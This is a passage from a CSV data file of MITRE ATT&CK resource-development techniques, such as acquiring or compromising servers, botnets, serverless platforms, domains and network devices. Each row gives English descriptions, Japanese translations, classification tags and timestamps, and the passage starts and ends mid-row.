の支援など、様々なタスクにサーバーを利用することがある。 第三者の[サーバー](https://attack.mitre.org/techniques/T1584/004)を侵害したり、[仮想プライベートサーバー](https://attack.mitre.org/techniques/T1583/003)をレンタルしたりする代わりに、攻撃者は作戦を支援するために独自のサーバーを設定して実行することを選択する場合があります。 クラウドサーバーの無料試用期間も悪用される可能性がある。（引用: Free Trial PurpleUrchin）（引用: Freejacked）敵対者は、活動の大半をオンラインインフラ上で実施する場合、軽量な設定のみで済む場合もある。あるいは、自システム上で活動の他の側面をテスト、通信、制御したい場合には、大規模なインフラ構築が必要となる場合もある。（引用: NYTStuxnet）,resource-development,PRE,script_command_execution,unknown,user_interaction;endpoint_execution;cloud_control_plane,specified,Unknown,subtechnique;has_created_ts;has_modified_ts,S0,unknown,,,,,Reconnaissance;ResourceDevelopment,attack-pattern--60c4b628-4807-4b0b-bbf5-fdac8643c337,2020-10-01T00:48:09.578Z,2025-04-15T23:05:58.721Z,,,,
T1583.005,T1583,Botnet,ボットネット,"Adversaries may buy, lease, or rent a network of compromised systems that can be used during targeting. A botnet is a network of compromised systems that can be instructed to perform coordinated tasks.(Citation: Norton Botnet) Adversaries may purchase a subscription to use an existing botnet from a booter/stresser service. Internet-facing edge devices and related network appliances that are end-of-life (EOL) and unsupported by their manufacturers are commonly acquired for botnet activities. Adversaries may lease operational relay box (ORB) networks  Econsisting of virtual private servers (VPS), small office/home office (SOHO) routers, or Internet of Things (IoT) devices  Eto serve as a botnet.(Citation: ORB Mandiant) With a botnet at their disposal, adversaries may perform follow-on activity such as large-scale [Phishing](https://attack.mitre.org/techniques/T1566) or Distributed Denial of Service (DDoS).(Citation: Imperva DDoS for Hire)(Citation: Krebs-Anna)(Citation: Krebs-Bazaar)(Citation: Krebs-Booter) Acquired botnets may also be used to support Command and Control activity, such as [Hide Infrastructure](https://attack.mitre.org/techniques/T1665) through an established [Proxy](https://attack.mitre.org/techniques/T1090) network.",敵対者は標的攻撃時に利用可能な侵害済みシステム群を、購入・リース・レンタルする可能性がある。ボットネットとは協調タスクを実行するよう指示可能な侵害済みシステム群のネットワークである。（引用：Norton Botnet）敵対者はブーター／ストレスサービスから既存ボットネットの利用権を購入する場合がある。 製造元によるサポートが終了した（EOL）インターネット接続エッジデバイスや関連ネットワーク機器は、ボットネット活動に広く流用される。敵対者は仮想専用サーバー（VPS）、小規模オフィス／ホームオフィス（SOHO）ルーター、モノのインターネット（IoT）デバイスで構成される運用リレーボックス（ORB）ネットワークをリースし、ボットネットとして運用する可能性がある。(引用元: ORB Mandiant) ボットネットを掌握した攻撃者は、大規模な[フィッシング](https://attack.mitre.org/techniques/T1566)や分散型サービス拒否攻撃(DDoS)などの追撃活動を実施する可能性がある。(引用元: Imperva DDoS for Hire)(引用元: Krebs-Anna)(引用元: Krebs-Bazaar)(引用元: Krebs-Booter) 取得したボットネットは、確立された[プロキシ](https://attack.mitre.org/techniques/T1090)ネットワークを介した[インフラ隠蔽](https://attack.mitre.org/techniques/T1665)など、コマンドアンドコントロール活動を支援するためにも使用される。,resource-development,PRE,script_command_execution,unknown,user_interaction;endpoint_execution;network_connectivity,specified,Proxy / Gateway,subtechnique;has_created_ts;has_modified_ts,S0,unknown,,,,,Reconnaissance;ResourceDevelopment,attack-pattern--31225cd3-cd46-4575-b287-c2c14011c074,2020-10-01T00:49:05.467Z,2025-04-16T13:29:34.161Z,,,,
T1583.006,T1583,Web Services,Web サービス,"Adversaries may register for web services that can be used during targeting. A variety of popular websites exist for adversaries to register for a web-based service that can be abused during later stages of the adversary lifecycle, such as during Command and Control ([Web Service](https://attack.mitre.org/techniques/T1102)), [Exfiltration Over Web Service](https://attack.mitre.org/techniques/T1567), or [Phishing](https://attack.mitre.org/techniques/T1566). Using common services, such as those offered by Google, GitHub, or Twitter, makes it easier for adversaries to hide in expected noise.(Citation: FireEye APT29)(Citation: Hacker News GitHub Abuse 2024) By utilizing a web service, adversaries can make it difficult to physically tie back operations to them.",敵対者は標的化中に利用可能なウェブサービスに登録する可能性がある。敵対者がウェブベースのサービスに登録するための様々な人気サイトが存在し、これらは敵対者のライフサイクルの後期段階（コマンド＆コントロール（[Web Service](https://attack.mitre.org/techniques/T1102)）、 [Webサービス経由のデータ流出](https://attack.mitre.org/techniques/T1567)、あるいは[フィッシング](https://attack.mitre.org/techniques/T1566)など。 Google、GitHub、Twitterなどが提供する一般的なサービスを利用することで、敵対者は予想されるノイズの中に潜伏しやすくなる。（引用元：FireEye APT29）（引用元：Hacker News GitHub Abuse 2024）ウェブサービスを利用することで、敵対者は自らの活動と物理的に結びつけることを困難にできる。,resource-development,PRE,script_command_execution,unknown,user_interaction;endpoint_execution,specified,Unknown,subtechnique;has_created_ts;has_modified_ts,S0,unknown,,,,,Reconnaissance;ResourceDevelopment,attack-pattern--88d31120-5bc7-4ce3-a9c0-7cf147be8e54,2020-10-01T00:50:29.936Z,2025-04-15T19:58:49.217Z,,,,
T1583.007,T1583,Serverless,サーバーレス,"Adversaries may purchase and configure serverless cloud infrastructure, such as Cloudflare Workers, AWS Lambda functions, or Google Apps Scripts, that can be used during targeting. By utilizing serverless infrastructure, adversaries can make it more difficult to attribute infrastructure used during operations back to them. Once acquired, the serverless runtime environment can be leveraged to either respond directly to infected machines or to [Proxy](https://attack.mitre.org/techniques/T1090) traffic to an adversary-owned command and control server.(Citation: BlackWater Malware Cloudflare Workers)(Citation: AWS Lambda Redirector)(Citation: GWS Apps Script Abuse 2021) As traffic generated by these functions will appear to come from subdomains of common cloud providers, it may be difficult to distinguish from ordinary traffic to these providers - making it easier to [Hide Infrastructure](https://attack.mitre.org/techniques/T1665).(Citation: Detecting Command & Control in the Cloud)(Citation: BlackWater Malware Cloudflare Workers)",敵対者は、Cloudflare Workers、AWS Lambda関数、Google Apps Scriptsなどのサーバーレスクラウドインフラを購入・設定し、標的攻撃時に利用する可能性がある。 サーバーレスインフラを利用することで、攻撃者は作戦中に使用したインフラを自身に帰属させることをより困難にできる。取得後、サーバーレスランタイム環境は、感染マシンに直接応答するため、または攻撃者が所有するコマンドアンドコントロールサーバーへのトラフィックを[プロキシ](https://attack.mitre.org/techniques/T1090)するために活用できる。(引用: BlackWater Malware Cloudflare Workers)(引用: AWS Lambda Redirector)(引用: GWS Apps Script Abuse 2021) これらの関数によって生成されるトラフィックは、一般的なクラウドプロバイダーのサブドメインからのもののように見えるため、これらのプロバイダーへの通常のトラフィックと区別することが困難になる可能性があります。これにより、[インフラストラクチャの隠蔽](https://attack.mitre.org/techniques/T1665)が容易になります。(引用: Detecting Command & Control in the Cloud)(引用: BlackWater Malware Cloudflare Workers),resource-development,PRE,script_command_execution,unknown,endpoint_execution;network_connectivity;cloud_control_plane,specified,Proxy / Gateway,subtechnique;has_created_ts;has_modified_ts,S0,unknown,,,,,Reconnaissance;ResourceDevelopment,attack-pattern--04a5a8ab-3bc8-4c83-95c9-55274a89786d,2022-07-08T12:39:29.684Z,2025-04-15T23:06:30.913Z,,,,
T1583.008,T1583,Malvertising,マルバタイジング,"Adversaries may purchase online advertisements that can be abused to distribute malware to victims. Ads can be purchased to plant as well as favorably position artifacts in specific locations online, such as prominently placed within search engine results. These ads may make it more difficult for users to distinguish between actual search results and advertisements.(Citation: spamhaus-malvertising) Purchased ads may also target specific audiences using the advertising network’s capabilities, potentially further taking advantage of the trust inherently given to search engines and popular websites. Adversaries may purchase ads and other resources to help distribute artifacts containing malicious code to victims. Purchased ads may attempt to impersonate or spoof well-known brands. For example, these spoofed ads may trick victims into clicking the ad which could then send them to a malicious domain that may be a clone of official websites containing trojanized versions of the advertised software.(Citation: Masquerads-Guardio)(Citation: FBI-search) Adversary’s efforts to create malicious domains and purchase advertisements may also be automated at scale to better resist cleanup efforts.(Citation: sentinelone-malvertising) Malvertising may be used to support [Drive-by Target](https://attack.mitre.org/techniques/T1608/004) and [Drive-by Compromise](https://attack.mitre.org/techniques/T1189), potentially requiring limited interaction from the user if the ad contains code/exploits that infect the target system's web browser.(Citation: BBC-malvertising) Adversaries may also employ several techniques to evade detection by the advertising network. For example, adversaries may dynamically route ad clicks to send automated crawler/policy enforcer traffic to benign sites while validating potential targets then sending victims referred from real ad clicks to malicious pages. This infection vector may therefore remain hidden from the ad network as well as any visitor not reaching the malicious sites with a valid identifier from clicking on the advertisement.(Citation: Masquerads-Guardio) Other tricks, such as intentional typos to avoid brand reputation monitoring, may also be used to evade automated detection.(Citation: spamhaus-malvertising)",攻撃者は、被害者にマルウェアを配布するために悪用可能なオンライン広告を購入する可能性があります。広告は、特定のオンライン場所（検索エンジンの結果内で目立つ位置など）にアーティファクトを配置したり、有利な位置に表示したりするために購入されます。 これらの広告は、ユーザーが実際の検索結果と広告を区別することを困難にする可能性がある。(引用: spamhaus-malvertising) 購入された広告は、広告ネットワークの機能を利用して特定のオーディエンスを標的とすることもでき、検索エンジンや人気ウェブサイトに内在する信頼をさらに悪用する可能性がある。攻撃者は、悪意のあるコードを含むアーティファクトを被害者に配布するために、広告やその他のリソースを購入する可能性がある。購入された広告は、有名なブランドを偽装またはなりすまそうとする可能性がある。 例えば、こうした偽装広告は被害者を騙してクリックさせ、広告されたソフトウェアのトロイの木馬版を含む公式ウェブサイトのクローンである悪意のあるドメインへ誘導する可能性があります。（引用元：Masquerads-Guardio）（引用元：FBI-search）悪意のあるドメインの作成や広告購入は、クリーンアップ対策への耐性を高めるため、大規模に自動化される場合もあります。（引用元：sentinelone-malvertising） マルバタイジングは[ドライブバイ攻撃](https://attack.mitre.org/techniques/T1608/004)や[ドライブバイ侵害](https://attack.mitre.org/techniques/T1189)を支援するために利用される可能性があり、広告に標的システムのウェブブラウザを感染させるコード/エクスプロイトが含まれている場合、ユーザーからの限定的な操作のみを必要とする可能性がある。(引用元: BBC-malvertising)攻撃者は広告ネットワークの検知を回避するため、複数の手法を採用する可能性がある。例えば、攻撃者は広告クリックを動的にルーティングし、自動化されたクローラー/ポリシー執行トラフィックを無害なサイトに送り込みながら潜在的な標的を検証し、その後、実際の広告クリックから誘導された被害者を悪意のあるページに送る。 したがって、この感染経路は広告ネットワークから隠蔽されるだけでなく、広告クリックによる有効な識別子を持たない訪問者にも検知されない可能性がある。(引用元: Masquerads-Guardio) ブランド評判監視を回避するための意図的なスペルミスなど、自動検知を回避する他の手法も使用される。(引用元: spamhaus-malvertising),resource-development,PRE,config_policy_manipulation,unknown,user_interaction;network_connectivity;cloud_control_plane;logging_monitoring,specified,Unknown,subtechnique;has_created_ts;has_modified_ts,S0,unknown,,,,,Reconnaissance;ResourceDevelopment,attack-pattern--155207c0-7f53-4f13-a06b-0a9907ef5096,2023-02-21T20:46:57.170Z,2025-04-15T22:47:29.928Z,,,,
T1584,,Compromise Infrastructure,侵害されたインフラストラクチャ,"Adversaries may compromise third-party infrastructure that can be used during targeting. Infrastructure solutions include physical or cloud servers, domains, network devices, and third-party web and DNS services. Instead of buying, leasing, or renting infrastructure an adversary may compromise infrastructure and use it during other phases of the adversary lifecycle.(Citation: Mandiant APT1)(Citation: ICANNDomainNameHijacking)(Citation: Talos DNSpionage Nov 2018)(Citation: FireEye EPS Awakens Part 2) Additionally, adversaries may compromise numerous machines to form a botnet they can leverage. Use of compromised infrastructure allows adversaries to stage, launch, and execute operations. Compromised infrastructure can help adversary operations blend in with traffic that is seen as normal, such as contact with high reputation or trusted sites. For example, adversaries may leverage compromised infrastructure (potentially also in conjunction with [Digital Certificates](https://attack.mitre.org/techniques/T1588/004)) to further blend in and support staged information gathering and/or [Phishing](https://attack.mitre.org/techniques/T1566) campaigns.(Citation: FireEye DNS Hijack 2019) Adversaries may also compromise numerous machines to support [Proxy](https://attack.mitre.org/techniques/T1090) and/or proxyware services or to form a botnet.(Citation: amnesty_nso_pegasus)(Citation: Sysdig Proxyjacking) Additionally, adversaries may compromise infrastructure residing in close proximity to a target in order to gain [Initial Access](https://attack.mitre.org/tactics/TA0001) via [Wi-Fi Networks](https://attack.mitre.org/techniques/T1669).(Citation: Nearest Neighbor Volexity) By using compromised infrastructure, adversaries may enable follow-on malicious operations. Prior to targeting, adversaries may also compromise the infrastructure of other adversaries.(Citation: NSA NCSC Turla OilRig)",攻撃者は標的攻撃時に利用可能な第三者インフラを侵害する可能性がある。インフラソリューションには物理/クラウドサーバー、ドメイン、ネットワーク機器、第三者Web/DNSサービスが含まれる。インフラを購入・リース・レンタルする代わりに、攻撃者はインフラを侵害し攻撃ライフサイクルの他のフェーズで再利用する。(引用: Mandiant APT1)(引用: ICANNドメイン名ハイジャック)(引用: Talos DNSpionage Nov 2018)(引用: FireEye EPS Awakens Part 2)さらに、攻撃者は多数の機器を侵害してボットネットを形成し、それを活用する可能性がある。侵害されたインフラの利用により、攻撃者は作戦の準備、開始、実行が可能となる。侵害されたインフラは、高評価サイトや信頼できるサイトとの通信など、通常と見なされるトラフィックに攻撃者の活動を溶け込ませるのに役立つ。 例えば、攻撃者は侵害されたインフラ（場合によっては[デジタル証明書](https://attack.mitre.org/techniques/T1588/004)と組み合わせて）を活用し、さらに溶け込ませることで、段階的な情報収集や[フィッシング](https://attack.mitre.org/techniques/T1566)キャンペーンを支援することがあります。(引用元: FireEye DNS Hijack 2019) また、攻撃者は多数のマシンを侵害し、[プロキシ](https://attack.mitre.org/techniques/T1090)やプロキシウェアサービスを支援したり、ボットネットを形成したりする可能性がある。(引用元: amnesty_nso_pegasus)(引用元: Sysdig Proxyjacking) さらに、攻撃者は標的の近傍に存在するインフラを侵害し、[Wi-Fiネットワーク](https://attack.mitre.org/techniques/T1669)経由で[初期アクセス](https://attack.mitre.org/tactics/TA0001)を得る場合がある。(引用元: Nearest Neighbor Volexity) 侵害されたインフラを利用することで、攻撃者は後続の悪意ある操作を可能にする。標的化に先立ち、攻撃者は他の攻撃者のインフラを侵害することもある。(引用元: NSA NCSC Turla OilRig),resource-development,PRE,other,unknown,user_interaction;endpoint_execution;network_connectivity;cloud_control_plane,specified,Proxy / Gateway,has_created_ts;has_modified_ts,S0,unknown,,,,,Reconnaissance;ResourceDevelopment,attack-pattern--7e3beebd-8bfe-4e7b-a892-e44ab06a75f9,2020-10-01T00:36:30.759Z,2025-04-15T19:58:45.612Z,,,,
T1584.001,T1584,Domains,ドメイン,"Adversaries may hijack domains and/or subdomains that can be used during targeting. Domain registration hijacking is the act of changing the registration of a domain name without the permission of the original registrant.(Citation: ICANNDomainNameHijacking) Adversaries may gain access to an email account for the person listed as the owner of the domain. The adversary can then claim that they forgot their password in order to make changes to the domain registration. Other possibilities include social engineering a domain registration help desk to gain access to an account, taking advantage of renewal process gaps, or compromising a cloud service that enables managing domains (e.g., AWS Route53).(Citation: Krebs DNS Hijack 2019) Subdomain hijacking can occur when organizations have DNS entries that point to non-existent or deprovisioned resources. In such cases, an adversary may take control of a subdomain to conduct operations with the benefit of the trust associated with that domain.(Citation: Microsoft Sub Takeover 2020) Adversaries who compromise a domain may also engage in domain shadowing by creating malicious subdomains under their control while keeping any existing DNS records. As service will not be disrupted, the malicious subdomains may go unnoticed for long periods of time.(Citation: Palo Alto Unit 42 Domain Shadowing 2022)",攻撃者は標的化時に使用可能なドメインおよび／またはサブドメインを乗っ取る可能性がある。ドメイン登録乗っ取りとは、元の登録者の許可なくドメイン名の登録情報を変更する行為である。(引用元: ICANN DomainNameHijacking) 攻撃者はドメイン所有者として登録されている人物のメールアカウントにアクセスする可能性がある。その後、パスワードを忘れたと偽ってドメイン登録情報の変更を要求する。 その他の手法として、ドメイン登録ヘルプデスクに対するソーシャルエンジニアリングによるアカウントアクセス取得、更新プロセスの隙間の悪用、ドメイン管理を可能にするクラウドサービス（例：AWS Route53）の侵害などが挙げられる（引用元：Krebs DNS Hijack 2019）。サブドメイン乗っ取りは、組織が非存在またはプロビジョニング解除されたリソースを指すDNSエントリを保持している場合に発生する可能性がある。 このような場合、攻撃者はサブドメインを乗っ取り、そのドメインに付随する信頼性を悪用した操作を実行する可能性があります。(引用元: Microsoft Sub Takeover 2020) ドメインを侵害した攻撃者は、既存のDNSレコードを維持したまま、自身の管理下に悪意のあるサブドメインを作成するドメインシャドーイングを行うこともあります。 サービスは中断されないため、悪意のあるサブドメインは長期間気づかれない可能性があります。(引用元: Palo Alto Unit 42 Domain Shadowing 2022),resource-development,PRE,credential_abuse,unknown,authentication_system;user_interaction;endpoint_execution;email_infrastructure;cloud_control_plane,specified,Mail / Collaboration,subtechnique;has_created_ts;has_modified_ts,S0,unknown,,,,,Reconnaissance;ResourceDevelopment,attack-pattern--f9cc4d06-775f-4ee1-b401-4e2cc0da30ba,2020-10-01T00:51:28.513Z,2025-04-15T22:22:55.487Z,,,,
T1584.002,T1584,DNS Server,DNSサーバー,"Adversaries may compromise third-party DNS servers that can be used during targeting. During post-compromise activity, adversaries may utilize DNS traffic for various tasks, including for Command and Control (ex: [Application Layer Protocol](https://attack.mitre.org/techniques/T1071)). Instead of setting up their own DNS servers, adversaries may compromise third-party DNS servers in support of operations. By compromising DNS servers, adversaries can alter DNS records. Such control can allow for redirection of an organization's traffic, facilitating Collection and Credential Access efforts for the adversary.(Citation: Talos DNSpionage Nov 2018)(Citation: FireEye DNS Hijack 2019) Additionally, adversaries may leverage such control in conjunction with [Digital Certificates](https://attack.mitre.org/techniques/T1588/004) to redirect traffic to adversary-controlled infrastructure, mimicking normal trusted network communications.(Citation: FireEye DNS Hijack 2019)(Citation: Crowdstrike DNS Hijack 2019) Adversaries may also be able to silently create subdomains pointed at malicious servers without tipping off the actual owner of the DNS server.(Citation: CiscoAngler)(Citation: Proofpoint Domain Shadowing)",攻撃者は標的攻撃時に利用可能なサードパーティDNSサーバーを侵害する可能性がある。侵害後の活動において、攻撃者はコマンド・アンド・コントロール（例：[アプリケーション層プロトコル](https://attack.mitre.org/techniques/T1071)）を含む様々なタスクにDNSトラフィックを利用する。 敵対者は独自のDNSサーバーを設置する代わりに、作戦支援のためにサードパーティのDNSサーバーを侵害することがある。DNSサーバーを侵害することで、敵対者はDNSレコードを改変できる。このような制御により、組織のトラフィックをリダイレクトすることが可能となり、敵対者の情報収集や認証情報取得活動を容易にする。(引用: Talos DNSpionage 2018年11月)(引用: FireEye DNSハイジャック 2019年) さらに攻撃者は、[デジタル証明書](https://attack.mitre.org/techniques/T1588/004)と組み合わせてこの制御を活用し、トラフィックを攻撃者管理インフラへリダイレクトすることで、通常の信頼されたネットワーク通信を模倣することが可能です。(引用: FireEye DNS Hijack 2019)(引用: Crowdstrike DNS Hijack 2019) 攻撃者はまた、DNSサーバーの実際の所有者に気付かれることなく、悪意のあるサーバーを指すサブドメインを密かに作成できる可能性がある。(引用: CiscoAngler)(引用: Proofpoint Domain Shadowing),resource-development,PRE,credential_abuse,unknown,authentication_system;endpoint_execution;network_connectivity,specified,Unknown,subtechnique;has_created_ts;has_modified_ts,S0,unknown,,,,,Reconnaissance;ResourceDevelopment,attack-pattern--c2f59d25-87fe-44aa-8f83-e8e59d077bf5,2020-10-01T00:54:30.869Z,2025-04-15T22:13:56.342Z,,,,
T1584.003,T1584,Virtual Private Server,仮想専用サーバー,"Adversaries may compromise third-party Virtual Private Servers (VPSs) that can be used during targeting. There exist a variety of cloud service providers that will sell virtual machines/containers as a service. Adversaries may compromise VPSs purchased by third-party entities. By compromising a VPS to use as infrastructure, adversaries can make it difficult to physically tie back operations to themselves.(Citation: NSA NCSC Turla OilRig) Compromising a VPS for use in later stages of the adversary lifecycle, such as Command and Control, can allow adversaries to benefit from the ubiquity and trust associated with higher reputation cloud service providers as well as that added by the compromised third-party.",攻撃者は標的攻撃時に利用可能なサードパーティの仮想専用サーバー（VPS）を侵害する可能性がある。仮想マシン／コンテナをサービスとして提供するクラウドサービスプロバイダーは多数存在する。攻撃者は第三者組織が購入したVPSを侵害する可能性がある。 インフラとしてVPSを侵害することで、攻撃者は自らの活動と物理的に結びつけることを困難にできる。（引用元：NSA NCSC Turla OilRig）コマンド＆コントロールなど攻撃ライフサイクルの後段階で使用するVPSを侵害することで、攻撃者は評判の高いクラウドサービスプロバイダーの普遍性と信頼性、および侵害された第三者が付加する信頼性の恩恵を受けられる。,resource-development,PRE,script_command_execution,unknown,authentication_system;endpoint_execution;cloud_control_plane,specified,Unknown,subtechnique;has_created_ts;has_modified_ts,S0,unknown,,,,,Reconnaissance;ResourceDevelopment,attack-pattern--39cc9f64-cf74-4a48-a4d8-fe98c54a02e0,2020-10-01T00:55:17.771Z,2025-04-15T23:19:04.087Z,,,,
T1584.004,T1584,Server,サーバー,"Adversaries may compromise third-party servers that can be used during targeting. Use of servers allows an adversary to stage, launch, and execute an operation. During post-compromise activity, adversaries may utilize servers for various tasks, including for Command and Control.(Citation: TrendMicro EarthLusca 2022) Instead of purchasing a [Server](https://attack.mitre.org/techniques/T1583/004) or [Virtual Private Server](https://attack.mitre.org/techniques/T1583/003), adversaries may compromise third-party servers in support of operations. Adversaries may also compromise web servers to support watering hole operations, as in [Drive-by Compromise](https://attack.mitre.org/techniques/T1189), or email servers to support [Phishing](https://attack.mitre.org/techniques/T1566) operations.",敵対者は標的攻撃時に利用可能な第三者サーバーを侵害する可能性がある。サーバーの使用により、敵対者は作戦の準備、開始、実行が可能となる。侵害後の活動において、敵対者はコマンドアンドコントロールを含む様々なタスクにサーバーを利用する可能性がある。(引用元: TrendMicro EarthLusca 2022) 敵対者は、[サーバー](https://attack.mitre.org/techniques/T1583/004) や [仮想専用サーバー](https://attack.mitre.org/techniques/T1583/003) を購入する代わりに、作戦支援のためにサードパーティサーバーを侵害する場合がある。 敵対者はまた、[ドライブバイ攻撃](https://attack.mitre.org/techniques/T1189) のような水飲み場攻撃を支援するために Web サーバーを侵害したり、[フィッシング](https://attack.mitre.org/techniques/T1566) 攻撃を支援するためにメールサーバーを侵害したりする可能性がある。,resource-development,PRE,script_command_execution,unknown,user_interaction;endpoint_execution;email_infrastructure,specified,Mail / Collaboration,subtechnique;has_created_ts;has_modified_ts,S0,unknown,,,,,Reconnaissance;ResourceDevelopment,attack-pattern--e196b5c5-8118-4a1c-ab8a-936586ce3db5,2020-10-01T00:56:25.135Z,2025-04-15T23:05:41.313Z,,,,
T1584.005,T1584,Botnet,ボットネット,"Adversaries may compromise numerous third-party systems to form a botnet that can be used during targeting. A botnet is a network of compromised systems that can be instructed to perform coordinated tasks.(Citation: Norton Botnet) Instead of purchasing/renting a botnet from a booter/stresser service, adversaries may build their own botnet by compromising numerous third-party systems.(Citation: Imperva DDoS for Hire) Adversaries may also conduct a takeover of an existing botnet, such as redirecting bots to adversary-controlled C2 servers.(Citation: Dell Dridex Oct 2015) With a botnet at their disposal, adversaries may perform follow-on activity such as large-scale [Phishing](https://attack.mitre.org/techniques/T1566) or Distributed Denial of Service (DDoS).",敵対者は標的攻撃時に利用可能なボットネットを形成するため、多数の第三者システムを侵害する可能性がある。ボットネットとは、協調的なタスクを実行するよう指示可能な侵害済みシステムのネットワークである。(引用元: Norton Botnet) 敵対者はブーター/ストレスサービスからボットネットを購入/レンタルする代わりに、多数の第三者システムを侵害することで独自のボットネットを構築する可能性がある。(引用元: Imperva DDoS for Hire) 攻撃者は既存ボットネットの乗っ取り（例: ボットを攻撃者管理のC2サーバーへリダイレクト）も実施可能。(引用元: Dell Dridex Oct 2015) 敵対者は、ボットネットを自由に使えることで、大規模な [フィッシング](https://attack.mitre.org/techniques/T1566) や分散型サービス妨害 (DDoS) などの追撃活動を行う可能性がある。,resource-development,PRE,c2_communication,unknown,user_interaction;network_connectivity,specified,Unknown,subtechnique;has_created_ts;has_modified_ts,S0,unknown,,,,,Reconnaissance;ResourceDevelopment,attack-pattern--810d8072-afb6-4a56-9ee7-86379ac4a6f3,2020-10-01T00:58:35.269Z,2025-04-16T13:38:12.734Z,,,,
T1584.006,T1584,Web Services,Web サービス,"Adversaries may compromise access to third-party web services that can be used during targeting. A variety of popular websites exist for legitimate users to register for web-based services, such as GitHub, Twitter, Dropbox, Google, SendGrid, etc. Adversaries may try to take ownership of a legitimate user's access to a web service and use that web service as infrastructure in support of cyber operations. Such web services can be abused during later stages of the adversary lifecycle, such as during Command and Control ([Web Service](https://attack.mitre.org/techniques/T1102)), [Exfiltration Over Web Service](https://attack.mitre.org/techniques/T1567), or [Phishing](https://attack.mitre.org/techniques/T1566).(Citation: Recorded Future Turla Infra 2020) Using common services, such as those offered by Google or Twitter, makes it easier for adversaries to hide in expected noise. By utilizing a web service, particularly when access is stolen from legitimate users, adversaries can make it difficult to physically tie back operations to them. Additionally, leveraging compromised web-based email services may allow adversaries to leverage the trust associated with legitimate domains.",攻撃者は標的攻撃時に利用可能なサードパーティWebサービスへのアクセス権を侵害する可能性がある。GitHub、Twitter、Dropbox、Google、SendGridなど、正当なユーザーがWebベースのサービスに登録するための多様な人気サイトが存在する。攻撃者は正当なユーザーのWebサービスアクセス権を乗っ取り、そのWebサービスをサイバー作戦支援インフラとして悪用しようとする。 こうしたウェブサービスは、敵対者ライフサイクルの後期段階（コマンド・アンド・コントロール（[Web Service](https://attack.mitre.org/techniques/T1102)）、 [Webサービス経由の情報流出](https://attack.mitre.org/techniques/T1567)、または[フィッシング](https://attack.mitre.org/techniques/T1566)などの段階で悪用される可能性があります。（出典：Recorded Future Turla Infra 2020）GoogleやTwitterが提供するような一般的なサービスを利用することで、敵対者は予想されるノイズの中に潜伏しやすくなります。特に正当なユーザーからアクセス権を盗んだ状態でウェブサービスを利用することで、敵対者は自らの活動と物理的に結びつけることを困難にできます。さらに、侵害されたウェブベースのメールサービスを活用することで、敵対者は正当なドメインに関連する信頼性を悪用できる可能性があります。,resource-development,PRE,script_command_execution,unknown,authentication_system;user_interaction;endpoint_execution;email_infrastructure,specified,Mail / Collaboration,subtechnique;has_created_ts;has_modified_ts,S0,unknown,,,,,Reconnaissance;ResourceDevelopment,attack-pattern--ae797531-3219-49a4-bccf-324ad7a4c7b2,2020-10-01T01:01:00.176Z,2025-04-15T23:20:42.131Z,,,,
T1584.007,T1584,Serverless,サーバーレス,"Adversaries may compromise serverless cloud infrastructure, such as Cloudflare Workers, AWS Lambda functions, or Google Apps Scripts, that can be used during targeting. By utilizing serverless infrastructure, adversaries can make it more difficult to attribute infrastructure used during operations back to them. Once compromised, the serverless runtime environment can be leveraged to either respond directly to infected machines or to [Proxy](https://attack.mitre.org/techniques/T1090) traffic to an adversary-owned command and control server.(Citation: BlackWater Malware Cloudflare Workers)(Citation: AWS Lambda Redirector)(Citation: GWS Apps Script Abuse 2021) As traffic generated by these functions will appear to come from subdomains of common cloud providers, it may be difficult to distinguish from ordinary traffic to these providers - making it easier to [Hide Infrastructure](https://attack.mitre.org/techniques/T1665).(Citation: Detecting Command & Control in the Cloud)(Citation: BlackWater Malware Cloudflare Workers)",敵対者は、Cloudflare Workers、AWS Lambda関数、Google Apps Scriptsなどのサーバーレスクラウドインフラを侵害し、標的攻撃時に利用する可能性がある。 サーバーレスインフラを利用することで、攻撃者は作戦中に使用したインフラを自身に帰属させることをより困難にできる。侵害されたサーバーレス実行環境は、感染マシンに直接応答するか、[プロキシ](https://attack.mitre.org/techniques/T1090) として攻撃者が所有するコマンドアンドコントロールサーバーへのトラフィックを中継するために悪用される可能性がある。(引用: BlackWater Malware Cloudflare Workers)(引用: AWS Lambda Redirector)(引用: GWS Apps Script Abuse 2021) これらの関数によって生成されるトラフィックは、一般的なクラウドプロバイダーのサブドメインからのもののように見えるため、これらのプロバイダーへの通常のトラフィックと区別することが困難になる可能性があります。これにより、[インフラストラクチャの隠蔽](https://attack.mitre.org/techniques/T1665)が容易になります。(引用: Detecting Command & Control in the Cloud)(引用: BlackWater Malware Cloudflare Workers),resource-development,PRE,script_command_execution,unknown,endpoint_execution;network_connectivity;cloud_control_plane,specified,Proxy / Gateway,subtechnique;has_created_ts;has_modified_ts,S0,unknown,,,,,Reconnaissance;ResourceDevelopment,attack-pattern--df1bc34d-1634-4c93-b89e-8120994fce77,2022-07-08T12:46:15.450Z,2025-04-15T23:06:14.037Z,,,,
T1584.008,T1584,Network Devices,ネットワークデバイス,"Adversaries may compromise third-party network devices that can be used during targeting. Network devices, such as small office/home office (SOHO) routers, may be compromised where the adversary's ultimate goal is not [Initial Access](https://attack.mitre.org/tactics/TA0001) to that environment -- instead leveraging these devices to support additional targeting. Once an adversary has control, compromised network devices can be used to launch additional operations, such as hosting payloads for [Phishing](https://attack.mitre.org/techniques/T1566) campaigns (i.e., [Link Target](https://attack.mitre.org/techniques/T1608/005)) or enabling the required access to execute [Content Injection](https://attack.mitre.org/techniques/T1659) operations. Adversaries may also be able to harvest reusable credentials (i.e., [Valid Accounts](https://attack.mitre.org/techniques/T1078)) from compromised network devices. Adversaries often target Internet-facing edge devices and related network appliances that specifically do not support robust host-based defenses.(Citation: Mandiant Fortinet Zero Day)(Citation: Wired Russia Cyberwar) Compromised network devices may be used to support subsequent [Command and Control](https://attack.mitre.org/tactics/TA0011) activity, such as [Hide Infrastructure](https://attack.mitre.org/techniques/T1665) through an established [Proxy](https://attack.mitre.org/techniques/T1090) and/or [Botnet](https://attack.mitre.org/techniques/T1584/005) network.(Citation: Justice GRU 2024)",攻撃者は標的化時に利用可能なサードパーティ製ネットワーク機器を侵害する可能性があります。小規模オフィス／ホームオフィス（SOHO）ルーターなどのネットワーク機器は、攻撃者の最終目的がその環境への[初期アクセス](https://attack.mitre.org/tactics/TA0001)ではなく、これらの機器を悪用して追加の標的化を支援する場合に侵害されることがあります。 攻撃者が制御権を獲得すると、侵害されたネットワーク機器は追加作戦の実行に利用される可能性があります。例えば、[フィッシング](https://attack.mitre.org/techniques/T1566)キャンペーン用のペイロードホスティング（例： [リンク標的](https://attack.mitre.org/techniques/T1608/005)）や、[コンテンツ注入](https://attack.mitre.org/techniques/T1659) 作戦実行に必要なアクセス権限の付与などが挙げられる。 